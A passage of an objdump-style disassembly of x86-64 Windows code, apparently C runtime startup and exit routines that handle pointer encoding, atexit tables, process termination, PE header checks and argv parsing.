   140002545:	cc                   	int3
   140002546:	cc                   	int3
   140002547:	cc                   	int3
   140002548:	33 c9                	xor    %ecx,%ecx
   14000254a:	e9 91 fd ff ff       	jmp    0x1400022e0
   14000254f:	cc                   	int3
   140002550:	40 53                	rex push %rbx
   140002552:	48 83 ec 20          	sub    $0x20,%rsp
   140002556:	48 8b 0d ab 65 01 00 	mov    0x165ab(%rip),%rcx        # 0x140018b08
   14000255d:	83 c8 ff             	or     $0xffffffff,%eax
   140002560:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140002564:	83 f8 01             	cmp    $0x1,%eax
   140002567:	75 1f                	jne    0x140002588
   140002569:	48 8b 0d 98 65 01 00 	mov    0x16598(%rip),%rcx        # 0x140018b08
   140002570:	48 8d 1d f9 4a 01 00 	lea    0x14af9(%rip),%rbx        # 0x140017070
   140002577:	48 3b cb             	cmp    %rbx,%rcx
   14000257a:	74 0c                	je     0x140002588
   14000257c:	e8 53 32 00 00       	call   0x1400057d4
   140002581:	48 89 1d 80 65 01 00 	mov    %rbx,0x16580(%rip)        # 0x140018b08
   140002588:	b0 01                	mov    $0x1,%al
   14000258a:	48 83 c4 20          	add    $0x20,%rsp
   14000258e:	5b                   	pop    %rbx
   14000258f:	c3                   	ret
   140002590:	48 83 ec 28          	sub    $0x28,%rsp
   140002594:	48 8b 0d c5 65 01 00 	mov    0x165c5(%rip),%rcx        # 0x140018b60
   14000259b:	e8 34 32 00 00       	call   0x1400057d4
   1400025a0:	48 8b 0d c1 65 01 00 	mov    0x165c1(%rip),%rcx        # 0x140018b68
   1400025a7:	48 83 25 b1 65 01 00 	andq   $0x0,0x165b1(%rip)        # 0x140018b60
   1400025ae:	00 
   1400025af:	e8 20 32 00 00       	call   0x1400057d4
   1400025b4:	48 8b 0d 7d 5a 01 00 	mov    0x15a7d(%rip),%rcx        # 0x140018038
   1400025bb:	48 83 25 a5 65 01 00 	andq   $0x0,0x165a5(%rip)        # 0x140018b68
   1400025c2:	00 
   1400025c3:	e8 0c 32 00 00       	call   0x1400057d4
   1400025c8:	48 8b 0d 71 5a 01 00 	mov    0x15a71(%rip),%rcx        # 0x140018040
   1400025cf:	48 83 25 61 5a 01 00 	andq   $0x0,0x15a61(%rip)        # 0x140018038
   1400025d6:	00 
   1400025d7:	e8 f8 31 00 00       	call   0x1400057d4
   1400025dc:	48 83 25 5c 5a 01 00 	andq   $0x0,0x15a5c(%rip)        # 0x140018040
   1400025e3:	00 
   1400025e4:	b0 01                	mov    $0x1,%al
   1400025e6:	48 83 c4 28          	add    $0x28,%rsp
   1400025ea:	c3                   	ret
   1400025eb:	cc                   	int3
   1400025ec:	48 8d 15 7d bc 00 00 	lea    0xbc7d(%rip),%rdx        # 0x14000e270
   1400025f3:	48 8d 0d 76 bb 00 00 	lea    0xbb76(%rip),%rcx        # 0x14000e170
   1400025fa:	e9 15 32 00 00       	jmp    0x140005814
   1400025ff:	cc                   	int3
   140002600:	48 83 ec 28          	sub    $0x28,%rsp
   140002604:	84 c9                	test   %cl,%cl
   140002606:	74 16                	je     0x14000261e
   140002608:	48 83 3d 48 65 01 00 	cmpq   $0x0,0x16548(%rip)        # 0x140018b58
   14000260f:	00 
   140002610:	74 05                	je     0x140002617
   140002612:	e8 a5 38 00 00       	call   0x140005ebc
   140002617:	b0 01                	mov    $0x1,%al
   140002619:	48 83 c4 28          	add    $0x28,%rsp
   14000261d:	c3                   	ret
   14000261e:	48 8d 15 4b bc 00 00 	lea    0xbc4b(%rip),%rdx        # 0x14000e270
   140002625:	48 8d 0d 44 bb 00 00 	lea    0xbb44(%rip),%rcx        # 0x14000e170
   14000262c:	48 83 c4 28          	add    $0x28,%rsp
   140002630:	e9 5f 32 00 00       	jmp    0x140005894
   140002635:	cc                   	int3
   140002636:	cc                   	int3
   140002637:	cc                   	int3
   140002638:	48 8d 05 f1 59 01 00 	lea    0x159f1(%rip),%rax        # 0x140018030
   14000263f:	c3                   	ret
   140002640:	48 8d 05 f1 59 01 00 	lea    0x159f1(%rip),%rax        # 0x140018038
   140002647:	c3                   	ret
   140002648:	48 83 ec 28          	sub    $0x28,%rsp
   14000264c:	ff 15 6e 31 01 00    	call   *0x1316e(%rip)        # 0x1400157c0
   140002652:	48 89 05 ef 59 01 00 	mov    %rax,0x159ef(%rip)        # 0x140018048
   140002659:	ff 15 69 31 01 00    	call   *0x13169(%rip)        # 0x1400157c8
   14000265f:	48 89 05 ea 59 01 00 	mov    %rax,0x159ea(%rip)        # 0x140018050
   140002666:	b0 01                	mov    $0x1,%al
   140002668:	48 83 c4 28          	add    $0x28,%rsp
   14000266c:	c3                   	ret
   14000266d:	cc                   	int3
   14000266e:	cc                   	int3
   14000266f:	cc                   	int3
   140002670:	48 8d 05 e1 59 01 00 	lea    0x159e1(%rip),%rax        # 0x140018058
   140002677:	c3                   	ret
   140002678:	4c 8b 05 b9 49 01 00 	mov    0x149b9(%rip),%r8        # 0x140017038
   14000267f:	4c 8b c9             	mov    %rcx,%r9
   140002682:	41 8b d0             	mov    %r8d,%edx
   140002685:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000268a:	83 e2 3f             	and    $0x3f,%edx
   14000268d:	2b ca                	sub    %edx,%ecx
   14000268f:	49 d3 c9             	ror    %cl,%r9
   140002692:	4d 33 c8             	xor    %r8,%r9
   140002695:	4c 89 0d c4 59 01 00 	mov    %r9,0x159c4(%rip)        # 0x140018060
   14000269c:	c3                   	ret
   14000269d:	cc                   	int3
   14000269e:	cc                   	int3
   14000269f:	cc                   	int3
   1400026a0:	48 89 0d b9 59 01 00 	mov    %rcx,0x159b9(%rip)        # 0x140018060
   1400026a7:	c3                   	ret
   1400026a8:	48 8b 15 89 49 01 00 	mov    0x14989(%rip),%rdx        # 0x140017038
   1400026af:	8b ca                	mov    %edx,%ecx
   1400026b1:	48 33 15 a8 59 01 00 	xor    0x159a8(%rip),%rdx        # 0x140018060
   1400026b8:	83 e1 3f             	and    $0x3f,%ecx
   1400026bb:	48 d3 ca             	ror    %cl,%rdx
   1400026be:	48 85 d2             	test   %rdx,%rdx
   1400026c1:	0f 95 c0             	setne  %al
   1400026c4:	c3                   	ret
   1400026c5:	cc                   	int3
   1400026c6:	cc                   	int3
   1400026c7:	cc                   	int3
   1400026c8:	48 8b 15 69 49 01 00 	mov    0x14969(%rip),%rdx        # 0x140017038
   1400026cf:	4c 8b c1             	mov    %rcx,%r8
   1400026d2:	8b ca                	mov    %edx,%ecx
   1400026d4:	48 33 15 85 59 01 00 	xor    0x15985(%rip),%rdx        # 0x140018060
   1400026db:	83 e1 3f             	and    $0x3f,%ecx
   1400026de:	48 d3 ca             	ror    %cl,%rdx
   1400026e1:	48 85 d2             	test   %rdx,%rdx
   1400026e4:	75 03                	jne    0x1400026e9
   1400026e6:	33 c0                	xor    %eax,%eax
   1400026e8:	c3                   	ret
   1400026e9:	49 8b c8             	mov    %r8,%rcx
   1400026ec:	48 8b c2             	mov    %rdx,%rax
   1400026ef:	48 ff 25 1a 79 01 00 	rex.W jmp *0x1791a(%rip)        # 0x14001a010
   1400026f6:	cc                   	int3
   1400026f7:	cc                   	int3
   1400026f8:	45 33 c0             	xor    %r8d,%r8d
   1400026fb:	33 d2                	xor    %edx,%edx
   1400026fd:	e9 26 01 00 00       	jmp    0x140002828
   140002702:	cc                   	int3
   140002703:	cc                   	int3
   140002704:	45 33 c0             	xor    %r8d,%r8d
   140002707:	41 8d 50 02          	lea    0x2(%r8),%edx
   14000270b:	e9 18 01 00 00       	jmp    0x140002828
   140002710:	33 d2                	xor    %edx,%edx
   140002712:	33 c9                	xor    %ecx,%ecx
   140002714:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140002718:	e9 0b 01 00 00       	jmp    0x140002828
   14000271d:	cc                   	int3
   14000271e:	cc                   	int3
   14000271f:	cc                   	int3
   140002720:	ba 02 00 00 00       	mov    $0x2,%edx
   140002725:	33 c9                	xor    %ecx,%ecx
   140002727:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   14000272b:	e9 f8 00 00 00       	jmp    0x140002828
   140002730:	48 83 ec 28          	sub    $0x28,%rsp
   140002734:	4c 8b 05 fd 48 01 00 	mov    0x148fd(%rip),%r8        # 0x140017038
   14000273b:	48 8b d1             	mov    %rcx,%rdx
   14000273e:	41 8b c0             	mov    %r8d,%eax
   140002741:	b9 40 00 00 00       	mov    $0x40,%ecx
   140002746:	83 e0 3f             	and    $0x3f,%eax
   140002749:	2b c8                	sub    %eax,%ecx
   14000274b:	4c 39 05 16 59 01 00 	cmp    %r8,0x15916(%rip)        # 0x140018068
   140002752:	75 12                	jne    0x140002766
   140002754:	48 d3 ca             	ror    %cl,%rdx
   140002757:	49 33 d0             	xor    %r8,%rdx
   14000275a:	48 89 15 07 59 01 00 	mov    %rdx,0x15907(%rip)        # 0x140018068
   140002761:	48 83 c4 28          	add    $0x28,%rsp
   140002765:	c3                   	ret
   140002766:	e8 6d 11 00 00       	call   0x1400038d8
   14000276b:	cc                   	int3
   14000276c:	48 89 0d f5 58 01 00 	mov    %rcx,0x158f5(%rip)        # 0x140018068
   140002773:	c3                   	ret
   140002774:	40 53                	rex push %rbx
   140002776:	48 83 ec 20          	sub    $0x20,%rsp
   14000277a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140002780:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140002785:	8b d9                	mov    %ecx,%ebx
   140002787:	48 8d 15 7a 19 01 00 	lea    0x1197a(%rip),%rdx        # 0x140014108
   14000278e:	33 c9                	xor    %ecx,%ecx
   140002790:	ff 15 82 30 01 00    	call   *0x13082(%rip)        # 0x140015818
   140002796:	85 c0                	test   %eax,%eax
   140002798:	74 1f                	je     0x1400027b9
   14000279a:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000279f:	48 8d 15 7a 09 01 00 	lea    0x1097a(%rip),%rdx        # 0x140013120
   1400027a6:	ff 15 84 30 01 00    	call   *0x13084(%rip)        # 0x140015830
   1400027ac:	48 85 c0             	test   %rax,%rax
   1400027af:	74 08                	je     0x1400027b9
   1400027b1:	8b cb                	mov    %ebx,%ecx
   1400027b3:	ff 15 57 78 01 00    	call   *0x17857(%rip)        # 0x14001a010
   1400027b9:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400027be:	48 85 c9             	test   %rcx,%rcx
   1400027c1:	74 06                	je     0x1400027c9
   1400027c3:	ff 15 df 2f 01 00    	call   *0x12fdf(%rip)        # 0x1400157a8
   1400027c9:	48 83 c4 20          	add    $0x20,%rsp
   1400027cd:	5b                   	pop    %rbx
   1400027ce:	c3                   	ret
   1400027cf:	cc                   	int3
   1400027d0:	40 53                	rex push %rbx
   1400027d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400027d6:	8b d9                	mov    %ecx,%ebx
   1400027d8:	e8 f7 3b 00 00       	call   0x1400063d4
   1400027dd:	83 f8 01             	cmp    $0x1,%eax
   1400027e0:	74 28                	je     0x14000280a
   1400027e2:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   1400027e9:	00 00 
   1400027eb:	8b 90 bc 00 00 00    	mov    0xbc(%rax),%edx
   1400027f1:	c1 ea 08             	shr    $0x8,%edx
   1400027f4:	f6 c2 01             	test   $0x1,%dl
   1400027f7:	75 11                	jne    0x14000280a
   1400027f9:	ff 15 e1 2f 01 00    	call   *0x12fe1(%rip)        # 0x1400157e0
   1400027ff:	48 8b c8             	mov    %rax,%rcx
   140002802:	8b d3                	mov    %ebx,%edx
   140002804:	ff 15 16 31 01 00    	call   *0x13116(%rip)        # 0x140015920
   14000280a:	8b cb                	mov    %ebx,%ecx
   14000280c:	e8 63 ff ff ff       	call   0x140002774
   140002811:	8b cb                	mov    %ebx,%ecx
   140002813:	ff 15 5f 2f 01 00    	call   *0x12f5f(%rip)        # 0x140015778
   140002819:	cc                   	int3
   14000281a:	cc                   	int3
   14000281b:	cc                   	int3
   14000281c:	33 c0                	xor    %eax,%eax
   14000281e:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   140002824:	0f 94 c0             	sete   %al
   140002827:	c3                   	ret
   140002828:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000282d:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140002832:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140002836:	55                   	push   %rbp
   140002837:	48 8b ec             	mov    %rsp,%rbp
   14000283a:	48 83 ec 50          	sub    $0x50,%rsp
   14000283e:	8b d9                	mov    %ecx,%ebx
   140002840:	45 85 c0             	test   %r8d,%r8d
   140002843:	75 4a                	jne    0x14000288f
   140002845:	33 c9                	xor    %ecx,%ecx
   140002847:	ff 15 d3 2f 01 00    	call   *0x12fd3(%rip)        # 0x140015820
   14000284d:	48 85 c0             	test   %rax,%rax
   140002850:	74 3d                	je     0x14000288f
   140002852:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140002857:	66 39 08             	cmp    %cx,(%rax)
   14000285a:	75 33                	jne    0x14000288f
   14000285c:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140002860:	48 03 c8             	add    %rax,%rcx
   140002863:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002869:	75 24                	jne    0x14000288f
   14000286b:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140002870:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140002874:	75 19                	jne    0x14000288f
   140002876:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   14000287d:	76 10                	jbe    0x14000288f
   14000287f:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140002886:	74 07                	je     0x14000288f
   140002888:	8b cb                	mov    %ebx,%ecx
   14000288a:	e8 e5 fe ff ff       	call   0x140002774
   14000288f:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140002893:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   140002897:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000289b:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000289f:	48 8d 45 20          	lea    0x20(%rbp),%rax
   1400028a3:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400028a7:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400028ab:	48 8d 45 28          	lea    0x28(%rbp),%rax
   1400028af:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400028b3:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400028b7:	b8 02 00 00 00       	mov    $0x2,%eax
   1400028bc:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400028c0:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   1400028c3:	89 45 d8             	mov    %eax,-0x28(%rbp)
   1400028c6:	e8 dd 00 00 00       	call   0x1400029a8
   1400028cb:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   1400028cf:	74 0b                	je     0x1400028dc
   1400028d1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400028d6:	48 83 c4 50          	add    $0x50,%rsp
   1400028da:	5d                   	pop    %rbp
   1400028db:	c3                   	ret
   1400028dc:	8b cb                	mov    %ebx,%ecx
   1400028de:	e8 ed fe ff ff       	call   0x1400027d0
   1400028e3:	cc                   	int3
   1400028e4:	40 53                	rex push %rbx
   1400028e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400028ea:	48 8b d9             	mov    %rcx,%rbx
   1400028ed:	80 3d 80 57 01 00 00 	cmpb   $0x0,0x15780(%rip)        # 0x140018074
   1400028f4:	0f 85 9f 00 00 00    	jne    0x140002999
   1400028fa:	b8 01 00 00 00       	mov    $0x1,%eax
   1400028ff:	87 05 6b 57 01 00    	xchg   %eax,0x1576b(%rip)        # 0x140018070
   140002905:	48 8b 01             	mov    (%rcx),%rax
   140002908:	8b 08                	mov    (%rax),%ecx
   14000290a:	85 c9                	test   %ecx,%ecx
   14000290c:	75 34                	jne    0x140002942
   14000290e:	48 8b 05 23 47 01 00 	mov    0x14723(%rip),%rax        # 0x140017038
   140002915:	8b c8                	mov    %eax,%ecx
   140002917:	83 e1 3f             	and    $0x3f,%ecx
   14000291a:	48 8b 15 47 57 01 00 	mov    0x15747(%rip),%rdx        # 0x140018068
   140002921:	48 3b d0             	cmp    %rax,%rdx
   140002924:	74 13                	je     0x140002939
   140002926:	48 33 c2             	xor    %rdx,%rax
   140002929:	48 d3 c8             	ror    %cl,%rax
   14000292c:	45 33 c0             	xor    %r8d,%r8d
   14000292f:	33 d2                	xor    %edx,%edx
   140002931:	33 c9                	xor    %ecx,%ecx
   140002933:	ff 15 d7 76 01 00    	call   *0x176d7(%rip)        # 0x14001a010
   140002939:	48 8d 0d 48 58 01 00 	lea    0x15848(%rip),%rcx        # 0x140018188
   140002940:	eb 0c                	jmp    0x14000294e
   140002942:	83 f9 01             	cmp    $0x1,%ecx
   140002945:	75 0d                	jne    0x140002954
   140002947:	48 8d 0d 52 58 01 00 	lea    0x15852(%rip),%rcx        # 0x1400181a0
   14000294e:	e8 bd 05 00 00       	call   0x140002f10
   140002953:	90                   	nop
   140002954:	48 8b 03             	mov    (%rbx),%rax
   140002957:	83 38 00             	cmpl   $0x0,(%rax)
   14000295a:	75 13                	jne    0x14000296f
   14000295c:	48 8d 15 25 2b 01 00 	lea    0x12b25(%rip),%rdx        # 0x140015488
   140002963:	48 8d 0d fe 2a 01 00 	lea    0x12afe(%rip),%rcx        # 0x140015468
   14000296a:	e8 bd 0c 00 00       	call   0x14000362c
   14000296f:	48 8d 15 22 2b 01 00 	lea    0x12b22(%rip),%rdx        # 0x140015498
   140002976:	48 8d 0d 13 2b 01 00 	lea    0x12b13(%rip),%rcx        # 0x140015490
   14000297d:	e8 aa 0c 00 00       	call   0x14000362c
   140002982:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140002986:	83 38 00             	cmpl   $0x0,(%rax)
   140002989:	75 0e                	jne    0x140002999
   14000298b:	c6 05 e2 56 01 00 01 	movb   $0x1,0x156e2(%rip)        # 0x140018074
   140002992:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140002996:	c6 00 01             	movb   $0x1,(%rax)
   140002999:	48 83 c4 20          	add    $0x20,%rsp
   14000299d:	5b                   	pop    %rbx
   14000299e:	c3                   	ret
   14000299f:	e8 34 0f 00 00       	call   0x1400038d8
   1400029a4:	90                   	nop
   1400029a5:	cc                   	int3
   1400029a6:	cc                   	int3
   1400029a7:	cc                   	int3
   1400029a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400029ad:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400029b2:	57                   	push   %rdi
   1400029b3:	48 83 ec 20          	sub    $0x20,%rsp
   1400029b7:	49 8b d9             	mov    %r9,%rbx
   1400029ba:	49 8b f8             	mov    %r8,%rdi
   1400029bd:	8b 0a                	mov    (%rdx),%ecx
   1400029bf:	e8 1c 1a 00 00       	call   0x1400043e0
   1400029c4:	90                   	nop
   1400029c5:	48 8b cf             	mov    %rdi,%rcx
   1400029c8:	e8 17 ff ff ff       	call   0x1400028e4
   1400029cd:	90                   	nop
   1400029ce:	8b 0b                	mov    (%rbx),%ecx
   1400029d0:	e8 27 1a 00 00       	call   0x1400043fc
   1400029d5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400029da:	48 83 c4 20          	add    $0x20,%rsp
   1400029de:	5f                   	pop    %rdi
   1400029df:	c3                   	ret
   1400029e0:	b8 01 00 00 00       	mov    $0x1,%eax
   1400029e5:	87 05 8d 56 01 00    	xchg   %eax,0x1568d(%rip)        # 0x140018078
   1400029eb:	c3                   	ret
   1400029ec:	40 53                	rex push %rbx
   1400029ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400029f2:	8b d9                	mov    %ecx,%ebx
   1400029f4:	e8 a7 1a 00 00       	call   0x1400044a0
   1400029f9:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140002a00:	41 8b d0             	mov    %r8d,%edx
   140002a03:	80 e2 02             	and    $0x2,%dl
   140002a06:	f6 da                	neg    %dl
   140002a08:	1b c9                	sbb    %ecx,%ecx
   140002a0a:	83 fb ff             	cmp    $0xffffffff,%ebx
   140002a0d:	74 36                	je     0x140002a45
   140002a0f:	85 db                	test   %ebx,%ebx
   140002a11:	74 39                	je     0x140002a4c
   140002a13:	83 fb 01             	cmp    $0x1,%ebx
   140002a16:	74 20                	je     0x140002a38
   140002a18:	83 fb 02             	cmp    $0x2,%ebx
   140002a1b:	74 15                	je     0x140002a32
   140002a1d:	e8 da 38 00 00       	call   0x1400062fc
   140002a22:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002a28:	e8 a3 2e 00 00       	call   0x1400058d0
   140002a2d:	83 c8 ff             	or     $0xffffffff,%eax
   140002a30:	eb 1d                	jmp    0x140002a4f
   140002a32:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   140002a36:	eb 04                	jmp    0x140002a3c
   140002a38:	41 83 c8 02          	or     $0x2,%r8d
   140002a3c:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   140002a43:	eb 07                	jmp    0x140002a4c
   140002a45:	83 0d 84 4e 01 00 ff 	orl    $0xffffffff,0x14e84(%rip)        # 0x1400178d0
   140002a4c:	8d 41 02             	lea    0x2(%rcx),%eax
   140002a4f:	48 83 c4 20          	add    $0x20,%rsp
   140002a53:	5b                   	pop    %rbx
   140002a54:	c3                   	ret
   140002a55:	cc                   	int3
   140002a56:	cc                   	int3
   140002a57:	cc                   	int3
   140002a58:	4c 8b dc             	mov    %rsp,%r11
   140002a5b:	48 83 ec 28          	sub    $0x28,%rsp
   140002a5f:	b8 04 00 00 00       	mov    $0x4,%eax
   140002a64:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140002a68:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140002a6c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002a70:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140002a74:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140002a78:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140002a7c:	e8 07 00 00 00       	call   0x140002a88
   140002a81:	48 83 c4 28          	add    $0x28,%rsp
   140002a85:	c3                   	ret
   140002a86:	cc                   	int3
   140002a87:	cc                   	int3
   140002a88:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a8d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002a92:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002a97:	57                   	push   %rdi
   140002a98:	48 83 ec 30          	sub    $0x30,%rsp
   140002a9c:	49 8b f9             	mov    %r9,%rdi
   140002a9f:	8b 0a                	mov    (%rdx),%ecx
   140002aa1:	e8 3a 19 00 00       	call   0x1400043e0
   140002aa6:	90                   	nop
   140002aa7:	48 8d 1d 9a 60 01 00 	lea    0x1609a(%rip),%rbx        # 0x140018b48
   140002aae:	48 8d 35 fb 4a 01 00 	lea    0x14afb(%rip),%rsi        # 0x1400175b0
   140002ab5:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002aba:	48 8d 05 8f 60 01 00 	lea    0x1608f(%rip),%rax        # 0x140018b50
   140002ac1:	48 3b d8             	cmp    %rax,%rbx
   140002ac4:	74 19                	je     0x140002adf
   140002ac6:	48 39 33             	cmp    %rsi,(%rbx)
   140002ac9:	74 0e                	je     0x140002ad9
   140002acb:	48 8b d6             	mov    %rsi,%rdx
   140002ace:	48 8b cb             	mov    %rbx,%rcx
   140002ad1:	e8 d6 42 00 00       	call   0x140006dac
   140002ad6:	48 89 03             	mov    %rax,(%rbx)
   140002ad9:	48 83 c3 08          	add    $0x8,%rbx
   140002add:	eb d6                	jmp    0x140002ab5
   140002adf:	8b 0f                	mov    (%rdi),%ecx
   140002ae1:	e8 16 19 00 00       	call   0x1400043fc
   140002ae6:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002aeb:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140002af0:	48 83 c4 30          	add    $0x30,%rsp
   140002af4:	5f                   	pop    %rdi
   140002af5:	c3                   	ret
   140002af6:	cc                   	int3
   140002af7:	cc                   	int3
   140002af8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002afd:	55                   	push   %rbp
   140002afe:	56                   	push   %rsi
   140002aff:	57                   	push   %rdi
   140002b00:	41 56                	push   %r14
   140002b02:	41 57                	push   %r15
   140002b04:	48 8b ec             	mov    %rsp,%rbp
   140002b07:	48 83 ec 30          	sub    $0x30,%rsp
   140002b0b:	33 ff                	xor    %edi,%edi
   140002b0d:	44 8b f1             	mov    %ecx,%r14d
   140002b10:	85 c9                	test   %ecx,%ecx
   140002b12:	0f 84 53 01 00 00    	je     0x140002c6b
   140002b18:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140002b1b:	83 f8 01             	cmp    $0x1,%eax
   140002b1e:	76 16                	jbe    0x140002b36
   140002b20:	e8 d7 37 00 00       	call   0x1400062fc
   140002b25:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140002b28:	89 18                	mov    %ebx,(%rax)
   140002b2a:	e8 a1 2d 00 00       	call   0x1400058d0
   140002b2f:	8b fb                	mov    %ebx,%edi
   140002b31:	e9 35 01 00 00       	jmp    0x140002c6b
   140002b36:	e8 b9 21 00 00       	call   0x140004cf4
   140002b3b:	48 8d 1d 3e 55 01 00 	lea    0x1553e(%rip),%rbx        # 0x140018080
   140002b42:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002b48:	48 8b d3             	mov    %rbx,%rdx
   140002b4b:	33 c9                	xor    %ecx,%ecx
   140002b4d:	e8 da 4d 00 00       	call   0x14000792c
   140002b52:	48 8b 35 ef 54 01 00 	mov    0x154ef(%rip),%rsi        # 0x140018048
   140002b59:	48 89 1d c8 54 01 00 	mov    %rbx,0x154c8(%rip)        # 0x140018028
   140002b60:	48 85 f6             	test   %rsi,%rsi
   140002b63:	74 05                	je     0x140002b6a
   140002b65:	40 38 3e             	cmp    %dil,(%rsi)
   140002b68:	75 03                	jne    0x140002b6d
   140002b6a:	48 8b f3             	mov    %rbx,%rsi
   140002b6d:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140002b71:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   140002b75:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140002b79:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002b7e:	45 33 c0             	xor    %r8d,%r8d
   140002b81:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   140002b85:	33 d2                	xor    %edx,%edx
   140002b87:	48 8b ce             	mov    %rsi,%rcx
   140002b8a:	e8 51 01 00 00       	call   0x140002ce0
   140002b8f:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   140002b93:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002b99:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140002b9d:	49 8b cf             	mov    %r15,%rcx
   140002ba0:	e8 db 00 00 00       	call   0x140002c80
   140002ba5:	48 8b d8             	mov    %rax,%rbx
   140002ba8:	48 85 c0             	test   %rax,%rax
   140002bab:	75 18                	jne    0x140002bc5
   140002bad:	e8 4a 37 00 00       	call   0x1400062fc
   140002bb2:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140002bb7:	33 c9                	xor    %ecx,%ecx
   140002bb9:	89 18                	mov    %ebx,(%rax)
   140002bbb:	e8 14 2c 00 00       	call   0x1400057d4
   140002bc0:	e9 6a ff ff ff       	jmp    0x140002b2f
   140002bc5:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   140002bc9:	48 8b d3             	mov    %rbx,%rdx
   140002bcc:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140002bd0:	48 8b ce             	mov    %rsi,%rcx
   140002bd3:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140002bd7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002bdc:	e8 ff 00 00 00       	call   0x140002ce0
   140002be1:	41 83 fe 01          	cmp    $0x1,%r14d
   140002be5:	75 16                	jne    0x140002bfd
   140002be7:	8b 45 40             	mov    0x40(%rbp),%eax
   140002bea:	ff c8                	dec    %eax
   140002bec:	48 89 1d 45 54 01 00 	mov    %rbx,0x15445(%rip)        # 0x140018038
   140002bf3:	89 05 37 54 01 00    	mov    %eax,0x15437(%rip)        # 0x140018030
   140002bf9:	33 c9                	xor    %ecx,%ecx
   140002bfb:	eb 69                	jmp    0x140002c66
   140002bfd:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   140002c01:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140002c05:	48 8b cb             	mov    %rbx,%rcx
   140002c08:	e8 5b 43 00 00       	call   0x140006f68
   140002c0d:	8b f0                	mov    %eax,%esi
   140002c0f:	85 c0                	test   %eax,%eax
   140002c11:	74 19                	je     0x140002c2c
   140002c13:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140002c17:	e8 b8 2b 00 00       	call   0x1400057d4
   140002c1c:	48 8b cb             	mov    %rbx,%rcx
   140002c1f:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140002c23:	e8 ac 2b 00 00       	call   0x1400057d4
   140002c28:	8b fe                	mov    %esi,%edi
   140002c2a:	eb 3f                	jmp    0x140002c6b
   140002c2c:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140002c30:	48 8b cf             	mov    %rdi,%rcx
   140002c33:	48 8b c2             	mov    %rdx,%rax
   140002c36:	48 39 3a             	cmp    %rdi,(%rdx)
   140002c39:	74 0c                	je     0x140002c47
